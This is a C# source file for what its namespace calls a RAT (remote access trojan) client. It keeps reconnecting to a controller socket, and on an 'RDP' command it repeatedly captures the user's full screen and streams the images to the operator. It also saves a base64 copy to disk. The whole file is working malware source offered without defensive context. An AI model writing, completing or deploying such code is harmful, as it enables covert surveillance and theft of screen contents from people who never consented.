using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
//using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
namespace RATReciever
{
    class Program
    {
        static bool Recieved = false;
        static NetworkStream NS;
        static StreamWriter SW;
        static StreamReader SR;
        static TcpClient TCPClient;
        static StringBuilder Input;
        static Thread ConnectThread;
        static bool rdp = false;
        static int i = 1;
        static void Main(string[] args)
        {
            //TCPClient.ReceiveTimeout = 10000;
            ConnectThread = new Thread(Client);
            ConnectThread.Start();
            Console.ReadLine();
        }

        static void Client()
        {
            
           
            for (; ; )
            {
                
                if (!IsConnected())
                    Connect();

                try
                {
                   // Console.WriteLine(SR.ReadLine());
                    Listen();
                    
                }

                catch
                {
                    Console.WriteLine("Connection Lost :(");
                }
                   
                Thread.Sleep(1000);
            }
        }
        

        static void Listen()
        {
            string Command = SR.ReadLine();
            switch (Command)
            {
                case "RDP":
                    Console.WriteLine("lolk");
                    rdp = true;
                    Thread FunctionThread = new Thread(RemoteDesktop);
                    FunctionThread.Start();
                    break;

                default:
                    break;

            }
        }

        static bool IsConnected()
        {
            try
            {
                if (!TCPClient.Connected)
                {
                    return false;
                }
                return true;
            }

            catch
            {
                Console.WriteLine("Starting Connection");
                return false;
            }
        }

        static void Connect()
        {
            try
            {
               TCPClient.Close();
               SR.Close();
               SW.Close();
            }
           
            catch { }
            TCPClient = new TcpClient();
            //TCPClient.ReceiveTimeout = 5000;
            while (!TCPClient.Connected)
            {
                try
                {
                    TCPClient.Connect("localhost", 58899);
                    Thread.Sleep(1000);
                }

                catch { }
            }

                Console.WriteLine("Connection Established!");
                NS = TCPClient.GetStream();
                SR = new StreamReader(NS);
                SW = new StreamWriter(NS);
                Input = new StringBuilder();
                Thread.Sleep(1000);
            
            
            //Console.WriteLine("Connected!");
        }

        static void RemoteDesktop()
        {
            
           while (rdp)
           {
                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics graphics = Graphics.FromImage(bitmap as Image);
                graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                byte[] imgByte = ImageToByte(bitmap);
                int size = imgByte.Length;
                Console.WriteLine("Awaiting Reply");
                Thread WaitReply = new Thread(Waiting);
                WaitReply.Start();
                while (!Recieved)
                {
                    SW.WriteLine(size.ToString());
                    SW.Flush();
                    Thread.Sleep(1000);
                }
                Console.WriteLine("Reply Recieved");
                NS.Flush();
               NS.Write(imgByte, 0, imgByte.Length);
               
               //NS.Flush();
               //string wat = Convert.ToBase64String(imgByte);
                File.WriteAllText("C:\\64Bytes.txt", Convert.ToBase64String(imgByte));
               // Bitmap test = ByteToImage(Convert.FromBase64String(wat));
               // test.Save("C:\\lolno.jpeg");
                Recieved = false;
//Thread.Sleep(1000);
            }
        }

        static void Waiting()
        {
            if (SR.ReadLine() == "OK")
            {
                Recieved = true;
            }
        }

        public static byte[] ImageToByte(Bitmap bmp)
        {
            MemoryStream ms = new MemoryStream();
            // Save to memory using the Jpeg format
            bmp.Save(ms, ImageFormat.Jpeg);

            // read to end
            byte[] bmpBytes = ms.GetBuffer();
            bmp.Dispose();
            ms.Close();

            return bmpBytes;
        }

        public static Bitmap ByteToImage(byte[] blob)
        {
            //ImageConverter ic = new ImageConverter();
            // Image img = (Image)ic.ConvertFrom(blob);
            // Bitmap bm = new Bitmap(img);
            // return bm;
            MemoryStream stream = new MemoryStream(blob);
            Image img = Image.FromStream(stream);
            return (Bitmap)img;

        }

    }
}
